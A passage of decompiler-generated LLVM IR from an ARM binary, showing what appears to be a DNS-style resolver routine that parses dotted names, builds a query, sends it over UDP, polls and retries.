  br i1 %v2_12c60, label %dec_label_pc_12c68, label %dec_label_pc_12c30

dec_label_pc_12c68:                               ; preds = %dec_label_pc_12c48
  %v8_12c6c = icmp sgt i32 %v0_12c98, 3
  br i1 %v8_12c6c, label %dec_label_pc_12c80, label %dec_label_pc_12c70

dec_label_pc_12c70:                               ; preds = %dec_label_pc_12c68
  %v7_12c70 = icmp eq i8 %v2_12c48, 46
  br i1 %v7_12c70, label %dec_label_pc_12c78, label %dec_label_pc_12cd4

dec_label_pc_12c78:                               ; preds = %dec_label_pc_12c70
  %v1_12c78 = add i32 %v0_12c84, 1
  store i32 %v1_12c78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c94

dec_label_pc_12c80:                               ; preds = %dec_label_pc_12c68
  %v2_12c80 = icmp eq i8 %v2_12c48, 0
  %v1_12c84 = add i32 %v0_12c84, 1
  store i32 %v1_12c84, i32* %r0.global-to-local, align 4
  br i1 %v2_12c80, label %dec_label_pc_12c94, label %dec_label_pc_12c8c

dec_label_pc_12c8c:                               ; preds = %dec_label_pc_12c80
  %v1_12c8c = and i32 %v6_12c54, 32
  %v2_12c8c = icmp eq i32 %v1_12c8c, 0
  br i1 %v2_12c8c, label %dec_label_pc_12cd4, label %dec_label_pc_12c94

dec_label_pc_12c94:                               ; preds = %dec_label_pc_12c8c, %dec_label_pc_12c80, %dec_label_pc_12c78
  %v0_12c1825 = phi i32 [ %v1_12c84, %dec_label_pc_12c8c ], [ %v1_12c84, %dec_label_pc_12c80 ], [ %v1_12c78, %dec_label_pc_12c78 ]
  %v4_12c94 = mul i32 %v1_12c94, 256
  %v5_12c94 = or i32 %v0_12c94, %v4_12c94
  %v1_12c98 = add nuw nsw i32 %v0_12c98, 1
  %v7_12ca0 = icmp slt i32 %v1_12c98, 5
  br i1 %v7_12ca0, label %dec_label_pc_12c10, label %dec_label_pc_12ca4

dec_label_pc_12c10.lr.ph:                         ; preds = %dec_label_pc_12bf4
  %v2_12c14.pre = load i32, i32* @global_var_205f0, align 4
  br label %dec_label_pc_12c10

dec_label_pc_12ca4:                               ; preds = %dec_label_pc_12c94
  %v2_12ca4 = icmp eq i32 %arg2, 0
  br i1 %v2_12ca4, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_12ca4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_12ca4
  %v3_12cc0 = call i32 @llvm.bswap.i32(i32 %v5_12c94)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_12ccc = inttoptr i32 %arg2 to i32*
  store i32 %v3_12cc0, i32* %v3_12ccc, align 4
  %v2_12cd0.pre = load i32, i32* %stack_var_-20, align 4
  %v17_12cd0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_12cd0 = phi i32 [ 1, %bb ], [ %v17_12cd0.pre, %bb41 ]
  %v2_12cd0 = phi i32 [ %v3_12bf8, %bb ], [ %v2_12cd0.pre, %bb41 ]
  store i32 %v2_12cd0, i32* @r4, align 4
  ret i32 %v17_12cd0

dec_label_pc_12cd4:                               ; preds = %dec_label_pc_12c70, %dec_label_pc_12c8c, %dec_label_pc_12c10, %dec_label_pc_12c30, %dec_label_pc_12bf4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12bf8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_12c14.pre, { 2, 1, 0 }
  uselistorder i32 %v1_12c98, { 1, 0 }
  uselistorder i32 %v0_12c84, { 0, 1, 3, 2 }
  uselistorder i32 %v3_12bf8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 7, 8, 2, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_12cd4, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_12c48, { 1, 0 }
}

define i32 @function_12ce0(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_12ce0:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_12ce0 = load i32, i32* @r4, align 4
  %v6_12ce0 = load i32, i32* @r5, align 4
  %v9_12ce0 = load i32, i32* @r6, align 4
  %v12_12ce0 = load i32, i32* @r7, align 4
  %v15_12ce0 = load i32, i32* @r8, align 4
  %v18_12ce0 = load i32, i32* @sb, align 4
  %v21_12ce0 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_12d00 = call i32 @function_fc78(i32 512)
  store i32 %v1_12d00, i32* @r7, align 4
  %v1_12d0c = call i32 @function_fc78(i32 1025)
  %v2_12d10 = icmp eq i32 %v1_12d0c, 0
  br i1 %v2_12d10, label %.thread8, label %bb

bb:                                               ; preds = %dec_label_pc_12ce0
  %v1_12d14 = load i32, i32* @r7, align 4
  %v3_12d14 = icmp eq i32 %v1_12d14, 0
  store i32 %v1_12d0c, i32* %stack_var_-236, align 4
  br i1 %v3_12d14, label %bb195, label %dec_label_pc_12d28

.thread8:                                         ; preds = %dec_label_pc_12ce0
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_13408

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_13408

dec_label_pc_12d28:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_12d2c = icmp eq i32 %arg3, 0
  br i1 %v2_12d2c, label %dec_label_pc_13408, label %dec_label_pc_12d34

dec_label_pc_12d34:                               ; preds = %dec_label_pc_12d28
  %v2_12d38 = load i8, i8* %arg1, align 1
  %v2_12d3c = icmp eq i8 %v2_12d38, 0
  br i1 %v2_12d3c, label %dec_label_pc_13408, label %dec_label_pc_12d44

dec_label_pc_12d44:                               ; preds = %dec_label_pc_12d34
  store i32 %tmp, i32* @r0, align 4
  %v0_12d48 = call i32 @function_f030()
  %v2_12d50 = add i32 %v0_12d48, %tmp
  %v1_12d54 = add i32 %v2_12d50, -1
  %v2_12d54 = inttoptr i32 %v1_12d54 to i8*
  %v3_12d54 = load i8, i8* %v2_12d54, align 1
  %v2_12d58 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_12d58, i32* @r4, align 4
  %v7_12d5c = icmp eq i8 %v3_12d54, 46
  %. = zext i1 %v7_12d5c to i32
  store i32 %v2_12d58, i32* @r0, align 4
  %v1_12d80 = call i32 @function_10d54()
  store i32 77204, i32* @lr, align 4
  %v1_12d90 = call i32 @function_10d4c()
  %v2_12d9c = load i32, i32* @global_var_22cb0.573, align 4
  %v2_12da0 = call i32 @function_cafc(i32 %v2_12d9c, i32 %arg3)
  %v3_12da8 = load i8, i8* @global_var_205fd.576, align 1
  %v4_12da8 = zext i8 %v3_12da8 to i32
  %v2_12dac = load i8, i8* bitcast (i8** @global_var_205fc.575 to i8*), align 4
  %v3_12dac = zext i8 %v2_12dac to i32
  %v4_12db4 = mul nuw nsw i32 %v4_12da8, 256
  %v5_12db4 = or i32 %v3_12dac, %v4_12db4
  store i32 %v5_12db4, i32* @sb, align 4
  store i32 %v2_12da0, i32* @sl, align 4
  store i32 %v2_12d58, i32* @r0, align 4
  %v1_12dc8 = call i32 @function_10d54()
  %v0_12dd4 = load i32, i32* @r5, align 4
  %v2_12df4 = ptrtoint i8* %stack_var_-188 to i32
  %v6_12e38 = bitcast i8* %stack_var_-188 to i32*
  %v2_12f18 = ptrtoint i32* %stack_var_-92 to i32
  %v3_12fb0 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_13014 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_13360 = icmp eq i1 %v7_12d5c, false
  %v7_13068 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_1314c = ptrtoint i32* %stack_var_-140 to i32
  %v9_13244 = icmp eq i32 %tmp147, %arg2
  %v7_131d8 = icmp eq i32 %arg2, 1
  %v2_13180 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_12dd4, 3
  br i1 %tmp292, label %dec_label_pc_12ddc.lr.ph.preheader.lr.ph, label %dec_label_pc_13414

dec_label_pc_12ddc.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_12d44
  %v2_130ec = icmp eq i32 %tmp156, 0
  %v8_131dc = icmp eq i32 %arg2, 28
  br label %dec_label_pc_12ddc.lr.ph.preheader

dec_label_pc_12ddc:                               ; preds = %dec_label_pc_12ddc.lr.ph, %dec_label_pc_133f8.backedge
  %v1_12de4 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_12ddc.lr.ph ], [ %v3_12f8c, %dec_label_pc_133f8.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_12ddc.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_133f8.backedge ]
  %v7_12de0 = icmp eq i32 %v1_12de4, -1
  br i1 %v7_12de0, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_12ddc
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_12ddc, %bb199
  %v1_12de8 = xor i1 %v7_12de0, true
  call void @__pseudo_cond_branch(i1 %v1_12de8, i32 ptrtoint (i32* @global_var_cbe4.578 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_12df4, i32* @r4, align 4
  %v0_12df8 = load i32, i32* @r7, align 4
  %v2_12dfc = inttoptr i32 %v0_12df8 to i8*
  %v3_12dfc = call i32 @function_ef70(i8* %v2_12dfc, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_12e0c = call i32 @function_ef70(i8* nonnull %stack_var_-188, i32 0)
  %v0_12e10 = load i32, i32* @sb, align 4
  %v1_12e10 = add i32 %v0_12e10, 1
  %v3_12e18 = urem i32 %v1_12e10, 65536
  store i32 %v3_12e18, i32* @sb, align 4
  %v0_12e24 = load i32, i32* @r7, align 4
  %v5_12e30 = trunc i32 %v1_12e10 to i8
  store i8 %v5_12e30, i8* %stack_var_-188, align 1
  %v7_12e38 = call i32 @function_1454c(i32* %v6_12e38, i32 %v0_12e24, i32 512, i32 1, i32 %v1_12e10)
  store i32 %v7_12e38, i32* @r5, align 4
  %v1_12e3c = icmp slt i32 %v7_12e38, 0
  br i1 %v1_12e3c, label %dec_label_pc_13414, label %dec_label_pc_12e44

dec_label_pc_12e44:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_12e4c = load i32, i32* %stack_var_-236, align 4
  %v4_12e50 = call i32 @function_f1d0(i32 %v2_12e4c, i32 %tmp, i32 1025)
  store i32 %v2_12d58, i32* @r0, align 4
  %v1_12e68 = call i32 @function_10d54()
  %v1_12e78 = call i32 @function_10d4c()
  %v1_12e88 = load i32, i32* @sl, align 4
  %v4_12e88 = mul i32 %v1_12e88, 4
  %v5_12e88 = add i32 %v4_12e88, %arg4
  %v6_12e88 = inttoptr i32 %v5_12e88 to i32*
  %v7_12e88 = load i32, i32* %v6_12e88, align 4
  store i32 %v7_12e88, i32* @r6, align 4
  br i1 %v1_12e84, label %dec_label_pc_12ecc, label %dec_label_pc_12e90

dec_label_pc_12e90:                               ; preds = %dec_label_pc_12e44
  %v2_12e98 = load i32, i32* @global_var_22f10.581, align 4
  %v6_12ea0 = icmp slt i32 %v6_133bc, %v2_12e98
  br i1 %v6_12ea0, label %dec_label_pc_12ea4, label %dec_label_pc_12ecc

dec_label_pc_12ea4:                               ; preds = %dec_label_pc_12e90
  store i32 ptrtoint (i32* @global_var_18128.583 to i32), i32* @r1, align 4
  %v2_12eac = load i32, i32* %stack_var_-236, align 4
  %v4_12eb0 = inttoptr i32 %v2_12eac to i8*
  %v5_12eb0 = call i32 @function_13d94(i8* %v4_12eb0, i32 ptrtoint (i32* @global_var_18128.583 to i32), i32 1025, i32 %v2_12e98)
  %v7_12ec0 = load i32, i32* %v6_12ec0, align 4
  store i32 %v7_12ec0, i32* @r1, align 4
  %v4_12ec8 = inttoptr i32 %v2_12eac to i8*
  %v5_12ec8 = call i32 @function_13d94(i8* %v4_12ec8, i32 %v7_12ec0, i32 1025, i32 ptrtoint (i32* @global_var_22ef0.585 to i32))
  br label %dec_label_pc_12ecc

dec_label_pc_12ecc:                               ; preds = %dec_label_pc_12e90, %dec_label_pc_12e44, %dec_label_pc_12ea4
  store i32 %v2_12d58, i32* @r0, align 4
  store i32 77536, i32* @lr, align 4
  %v1_12edc = call i32 @function_10d54()
  %v2_12ee8 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_12ee8, i32* %stack_var_-56, align 4
  %v0_12ef8 = load i32, i32* @r7, align 4
  %v1_12ef8 = load i32, i32* @r5, align 4
  %v2_12ef8 = add i32 %v1_12ef8, %v0_12ef8
  %v1_12efc = sub i32 512, %v1_12ef8
  %v8_12f04 = call i32 @function_146ec(i32* nonnull %stack_var_-56, i32 %v2_12ef8, i32 %v1_12efc, i32 %arg2, i32 %v2_12ee8, i32 %arg2, i32 1)
  store i32 %v8_12f04, i32* @fp, align 4
  %v1_12f08 = icmp slt i32 %v8_12f04, 0
  br i1 %v1_12f08, label %dec_label_pc_13414, label %dec_label_pc_12f10

dec_label_pc_12f10:                               ; preds = %dec_label_pc_12ecc
  store i32 0, i32* @r4, align 4
  %v0_12f20 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_12f2c = inttoptr i32 %v0_12f20 to i8*
  %v4_12f2c = call i32 @function_13f78(i32 10, i8* %v3_12f2c, i32 %v2_12f18)
  %v1_12f30 = load i32, i32* @r4, align 4
  %v7_12f34 = icmp sgt i32 %v4_12f2c, %v1_12f30
  br i1 %v7_12f34, label %bb201, label %dec_label_pc_12f10..thread11_crit_edge

dec_label_pc_12f10..thread11_crit_edge:           ; preds = %dec_label_pc_12f10
  %v3_12f40.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_12f10
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_12f10..thread11_crit_edge, %bb201
  %v3_12f40 = phi i8 [ %v3_12f40.pre, %dec_label_pc_12f10..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_12f40 = sext i8 %v3_12f40 to i32
  %v8_12f3c.op = urem i32 %v1_12f30, 256
  %v8_12f3c.op.op = mul nuw nsw i32 %v8_12f3c.op, 256
  %v4_12f48 = select i1 %v7_12f34, i32 %v8_12f3c.op.op, i32 0
  %v5_12f48 = or i32 %v4_12f40, %v4_12f48
  %v7_12f4c = icmp eq i32 %v5_12f48, 10
  br i1 %v7_12f4c, label %dec_label_pc_12f78, label %dec_label_pc_12f60

dec_label_pc_12f60:                               ; preds = %.thread11
  %v0_12f64 = load i32, i32* @r6, align 4
  store i32 %v0_12f64, i32* @r0, align 4
  %v1_12f70 = call i32 @function_f730(i32 %v0_12f64)
  %v3_12f78.pre = load i8, i8* %stack_var_-100, align 1
  br label %dec_label_pc_12f78

dec_label_pc_12f78:                               ; preds = %.thread11, %dec_label_pc_12f60
  %v3_12f78 = phi i8 [ %v3_12f78.pre, %dec_label_pc_12f60 ], [ %v3_12f40, %.thread11 ]
  %v4_12f78 = sext i8 %v3_12f78 to i32
  %v5_12f88 = or i32 %v4_12f78, %v4_12f48
  %v3_12f8c = call i32 @function_fc4c(i32 %v5_12f88, i32 2, i32 17)
  %v1_12f90 = icmp slt i32 %v3_12f8c, 0
  br i1 %v1_12f90, label %.thread, label %dec_label_pc_12fa8

.thread:                                          ; preds = %dec_label_pc_12f78
  br label %dec_label_pc_133f8.backedge

dec_label_pc_133f8.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_12ddc, label %dec_label_pc_13414

dec_label_pc_12fa8:                               ; preds = %dec_label_pc_12f78
  %v4_12fb0 = call i32 @function_fb64(i32 %v3_12f8c, %sockaddr* nonnull %v3_12fb0, i32 28)
  %v1_12fb4 = icmp slt i32 %v4_12fb0, 0
  br i1 %v1_12fb4, label %dec_label_pc_12fbc, label %dec_label_pc_12fdc

dec_label_pc_12fbc:                               ; preds = %dec_label_pc_12fa8
  %v0_12fbc = call i32 @function_cec4()
  %v1_12fc0 = inttoptr i32 %v0_12fbc to i32*
  %v2_12fc0 = load i32, i32* %v1_12fc0, align 4
  %v7_12fc4 = icmp eq i32 %v2_12fc0, 101
  br i1 %v7_12fc4, label %dec_label_pc_13328, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_12fbc
  br label %dec_label_pc_133f8.backedge

dec_label_pc_12fdc:                               ; preds = %dec_label_pc_12fa8
  %v0_12fdc = load i32, i32* @r5, align 4
  %v1_12fdc = load i32, i32* @fp, align 4
  %v2_12fdc = add i32 %v1_12fdc, %v0_12fdc
  %v0_12fe0 = load i32, i32* @r7, align 4
  %v4_12fec = inttoptr i32 %v0_12fe0 to i32*
  %v5_12fec = call i32 @function_13808(i32 %v3_12f8c, i32* %v4_12fec, i32 %v2_12fdc, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v3_12f8c, i32* %stack_var_-44, align 4
  %v11_13014 = call i32 @function_13934(%pollfd* %v10_13014, i32 1, i32 10000, i32 1, i32 %v3_12f8c, i32 1, i32 0)
  %v1_13018 = load i32, i32* @r4, align 4
  %v7_1301c = icmp sgt i32 %v11_13014, %v1_13018
  br i1 %v7_1301c, label %dec_label_pc_13020, label %dec_label_pc_13328

dec_label_pc_13020:                               ; preds = %dec_label_pc_12fdc
  %v0_13028 = load i32, i32* @r7, align 4
  %v4_13030 = inttoptr i32 %v0_13028 to i32*
  %v5_13030 = call i32 @function_fbbc(i32 %v3_12f8c, i32* %v4_13030, i32 512, i32 %v1_13018)
  store i32 %v5_13030, i32* @fp, align 4
  %v7_1303c = icmp slt i32 %v5_13030, 12
  br i1 %v7_1303c, label %dec_label_pc_1335c, label %dec_label_pc_13040

dec_label_pc_13040:                               ; preds = %dec_label_pc_13020
  %v0_13040 = load i32, i32* @r7, align 4
  %v2_13048 = inttoptr i32 %v0_13040 to i8*
  %v3_13048 = call i32 @function_14634(i8* %v2_13048, i32 %v2_12df4)
  %v3_1304c = load i8, i8* %stack_var_-188, align 1
  %v4_1304c = sext i8 %v3_1304c to i32
  store i32 %v4_1304c, i32* @r6, align 4
  %v1_13050 = load i32, i32* @sb, align 4
  %v9_13050 = icmp eq i32 %v4_1304c, %v1_13050
  br i1 %v9_13050, label %dec_label_pc_13058, label %dec_label_pc_1335c

dec_label_pc_13058:                               ; preds = %dec_label_pc_13040
  %v1_1305c = load i32, i32* @r4, align 4
  %v9_1305c = icmp eq i32 %tmp157, %v1_1305c
  br i1 %v9_1305c, label %dec_label_pc_1335c, label %dec_label_pc_13064

dec_label_pc_13064:                               ; preds = %dec_label_pc_13058
  br i1 %v7_13068, label %dec_label_pc_13070, label %dec_label_pc_130ec

dec_label_pc_13070:                               ; preds = %dec_label_pc_13064
  %v9_13074 = icmp eq i32 %., %v1_1305c
  br i1 %v9_13074, label %dec_label_pc_1307c, label %dec_label_pc_130e0

dec_label_pc_1307c:                               ; preds = %dec_label_pc_13070
  store i32 %v2_12d58, i32* @r5, align 4
  store i32 %v2_12d58, i32* @r0, align 4
  %v1_13094 = call i32 @function_10d54()
  %v1_130a4 = call i32 @function_10d4c()
  store i32 %v2_12d58, i32* @r0, align 4
  %v2_130b0 = load i32, i32* @global_var_22f10.581, align 4
  %v1_130c0 = call i32 @function_10d54()
  %v1_130c8 = add i32 %v2_130b0, -1
  store i32 %v1_130c8, i32* @r4, align 4
  %v5_130d0 = icmp slt i32 %v6_133bc, %v1_130c8
  br i1 %v5_130d0, label %.thread19, label %dec_label_pc_130e0

.thread19:                                        ; preds = %dec_label_pc_1307c
  %v7_130d0 = add i32 %v6_133bc, 1
  %v6_130d4 = load i32, i32* @r6, align 4
  store i32 %v6_130d4, i32* @sb, align 4
  br label %dec_label_pc_133f8.outer.backedge

dec_label_pc_130e0:                               ; preds = %dec_label_pc_1307c, %dec_label_pc_13070
  %v0_130e0 = call i32 @function_11514()
  br label %dec_label_pc_13110

dec_label_pc_130ec:                               ; preds = %dec_label_pc_13064
  br i1 %v2_130ec, label %dec_label_pc_130f4, label %dec_label_pc_1335c

dec_label_pc_130f4:                               ; preds = %dec_label_pc_130ec
  br i1 %tmp198, label %dec_label_pc_13108, label %dec_label_pc_13120.preheader

dec_label_pc_13120.preheader:                     ; preds = %dec_label_pc_130f4
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_13120

dec_label_pc_13108:                               ; preds = %dec_label_pc_130f4
  %v0_13108 = call i32 @function_11514()
  br label %dec_label_pc_13110

dec_label_pc_13110:                               ; preds = %dec_label_pc_130e0, %dec_label_pc_13108
  %storemerge4 = phi i32 [ %v0_13108, %dec_label_pc_13108 ], [ %v0_130e0, %dec_label_pc_130e0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_13108 ], [ 1, %dec_label_pc_130e0 ]
  %v2_13110 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_13110, align 4
  br label %dec_label_pc_13424

dec_label_pc_13118:                               ; preds = %dec_label_pc_13120
  %v2_13118 = call i32 @function_14748(i32 %v0_1312c, i32 %v0_13128)
  %v0_1311c = load i32, i32* @r5, align 4
  %v2_1311c = add i32 %v0_1311c, %v2_13118
  store i32 %v2_1311c, i32* @r5, align 4
  %v0_13124.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13120

dec_label_pc_13120:                               ; preds = %dec_label_pc_13120.preheader, %dec_label_pc_13118
  %v0_13128 = phi i32 [ 12, %dec_label_pc_13120.preheader ], [ %v2_1311c, %dec_label_pc_13118 ]
  %v0_13130 = phi i32 [ 0, %dec_label_pc_13120.preheader ], [ %v0_13124.pre, %dec_label_pc_13118 ]
  store i32 %v0_13128, i32* @r1, align 4
  %v0_1312c = load i32, i32* @r7, align 4
  store i32 %v0_1312c, i32* @r0, align 4
  %v1_13130 = add i32 %v0_13130, 1
  store i32 %v1_13130, i32* @r4, align 4
  %v5_13134 = icmp slt i32 %v0_13130, 1
  br i1 %v5_13134, label %dec_label_pc_13118, label %dec_label_pc_13138

dec_label_pc_13138:                               ; preds = %dec_label_pc_13120
  br label %dec_label_pc_13294

dec_label_pc_1314c:                               ; preds = %bb205
  store i32 %v2_1314c, i32* @r4, align 4
  %v0_13150 = load i32, i32* @r7, align 4
  %v0_13158 = load i32, i32* @fp, align 4
  %v5_13160 = call i32 @function_1475c(i32 %v0_13150, i32 %v0_13154, i32 %v0_13158, i32* nonnull %stack_var_-140)
  %v1_13164 = icmp slt i32 %v5_13160, 0
  br i1 %v1_13164, label %dec_label_pc_13170, label %dec_label_pc_1318c

dec_label_pc_13170:                               ; preds = %dec_label_pc_1314c
  %v2_13174 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_13174, label %dec_label_pc_1335c, label %dec_label_pc_1317c

dec_label_pc_1317c:                               ; preds = %dec_label_pc_13170
  br i1 %v2_13180, label %dec_label_pc_1335c, label %dec_label_pc_132a8

dec_label_pc_1318c:                               ; preds = %dec_label_pc_1314c
  %v2_13190 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_13190, label %dec_label_pc_13234, label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %dec_label_pc_1318c
  %v0_13198 = load i32, i32* @r8, align 4
  %v6_1319c = add i32 %v0_13198, 36
  %v7_1319c = inttoptr i32 %v6_1319c to i32*
  %v8_1319c = load i32, i32* %v7_1319c, align 4
  store i32 %v8_1319c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_1314c, i32* @r1, align 4
  store i32 %v0_13198, i32* @r0, align 4
  %v0_131b8 = call i32 @function_ef60()
  %v0_131bc = load i32, i32* @r8, align 4
  %v1_131bc = add i32 %v0_131bc, 4
  %v2_131bc = inttoptr i32 %v1_131bc to i32*
  %v3_131bc = load i32, i32* %v2_131bc, align 4
  %v7_131c0 = icmp eq i32 %v3_131bc, 24
  br i1 %v7_131c0, label %dec_label_pc_131e4, label %dec_label_pc_131c8

dec_label_pc_131c8:                               ; preds = %dec_label_pc_13198
  %v1_131c8 = add i32 %v0_131bc, 28
  %v2_131c8 = inttoptr i32 %v1_131c8 to i32*
  %v3_131c8 = load i32, i32* %v2_131c8, align 4
  %v2_131cc = icmp eq i32 %v3_131c8, 0
  br i1 %v2_131cc, label %dec_label_pc_132a8, label %dec_label_pc_131d4

dec_label_pc_131d4:                               ; preds = %dec_label_pc_131c8
  br i1 %v7_131d8, label %dec_label_pc_131e4, label %bb203

bb203:                                            ; preds = %dec_label_pc_131d4
  br i1 %v8_131dc, label %dec_label_pc_131e4, label %dec_label_pc_132a8

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131d4, %bb203, %dec_label_pc_13198
  %v9_131e8 = icmp eq i32 %v3_131bc, %arg2
  br i1 %v9_131e8, label %dec_label_pc_131fc, label %dec_label_pc_131f0

dec_label_pc_131f0:                               ; preds = %dec_label_pc_131e4
  %v1_131f0 = inttoptr i32 %v0_131bc to i32*
  %v2_131f0 = load i32, i32* %v1_131f0, align 4
  store i32 %v2_131f0, i32* @r0, align 4
  %v0_131f4 = call i32 @function_fdcc()
  br label %dec_label_pc_13280

dec_label_pc_131fc:                               ; preds = %dec_label_pc_131e4
  %v1_13204 = add i32 %v0_131bc, 16
  %v2_13204 = inttoptr i32 %v1_13204 to i32*
  %v3_13204 = load i32, i32* %v2_13204, align 4
  %v2_13208 = sub i32 %tmp155, %stack_var_-192.0
  %v1_1320c = add i32 %v2_13208, -1
  %v1_13210 = add i32 %v3_13204, 4
  %v2_13214 = mul i32 %v1_13210, %v1_1320c
  %v1_13218 = add i32 %v0_131bc, 32
  %v2_13218 = inttoptr i32 %v1_13218 to i32*
  %v3_13218 = load i32, i32* %v2_13218, align 4
  %v2_13220 = add i32 %v0_131bc, 36
  %v3_13220 = inttoptr i32 %v2_13220 to i32*
  store i32 %v1_1320c, i32* %v3_13220, align 4
  %tmp294 = icmp ugt i32 %v2_13214, %v3_13218
  br i1 %tmp294, label %dec_label_pc_132a8, label %dec_label_pc_131fc.dec_label_pc_1327c_crit_edge

dec_label_pc_131fc.dec_label_pc_1327c_crit_edge:  ; preds = %dec_label_pc_131fc
  %v1_1327c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1327c

dec_label_pc_13234:                               ; preds = %dec_label_pc_1318c
  %v3_13234 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_13234, i32* @r0, align 4
  %v0_13238 = call i32 @function_fdcc()
  br i1 %v9_13244, label %dec_label_pc_1324c, label %dec_label_pc_13280

dec_label_pc_1324c:                               ; preds = %dec_label_pc_13234
  %v0_1324c = load i32, i32* @r8, align 4
  %v1_1324c = add i32 %v0_1324c, 16
  %v2_1324c = inttoptr i32 %v1_1324c to i32*
  %v3_1324c = load i32, i32* %v2_1324c, align 4
  %v9_13254 = icmp eq i32 %v3_1324c, %tmp146
  br i1 %v9_13254, label %dec_label_pc_1325c, label %dec_label_pc_13354

dec_label_pc_1325c:                               ; preds = %dec_label_pc_1324c
  %v1_1325c = add i32 %v0_1324c, 36
  %v2_1325c = inttoptr i32 %v1_1325c to i32*
  %v3_1325c = load i32, i32* %v2_1325c, align 4
  %v1_13260 = add i32 %v0_1324c, 28
  %v2_13260 = inttoptr i32 %v1_13260 to i32*
  %v3_13260 = load i32, i32* %v2_13260, align 4
  %v3_13264 = mul i32 %v3_1325c, %tmp146
  %v4_13264 = add i32 %v3_13260, %v3_13264
  store i32 %v4_13264, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_13270 = call i32 @function_ef60()
  %v0_13274 = load i32, i32* @r8, align 4
  %v1_13274 = add i32 %v0_13274, 36
  %v2_13274 = inttoptr i32 %v1_13274 to i32*
  %v3_13274 = load i32, i32* %v2_13274, align 4
  %v1_13278 = add i32 %v3_13274, 1
  br label %dec_label_pc_1327c

dec_label_pc_1327c:                               ; preds = %dec_label_pc_131fc.dec_label_pc_1327c_crit_edge, %dec_label_pc_1325c
  %v1_1327c = phi i32 [ %v0_13274, %dec_label_pc_1325c ], [ %v1_1327c.pre, %dec_label_pc_131fc.dec_label_pc_1327c_crit_edge ]
  %storemerge5 = phi i32 [ %v1_13278, %dec_label_pc_1325c ], [ 0, %dec_label_pc_131fc.dec_label_pc_1327c_crit_edge ]
  %v2_1327c = add i32 %v1_1327c, 36
  %v3_1327c = inttoptr i32 %v2_1327c to i32*
  store i32 %storemerge5, i32* %v3_1327c, align 4
  br label %dec_label_pc_13280

dec_label_pc_13280:                               ; preds = %dec_label_pc_13234, %dec_label_pc_131f0, %dec_label_pc_1327c
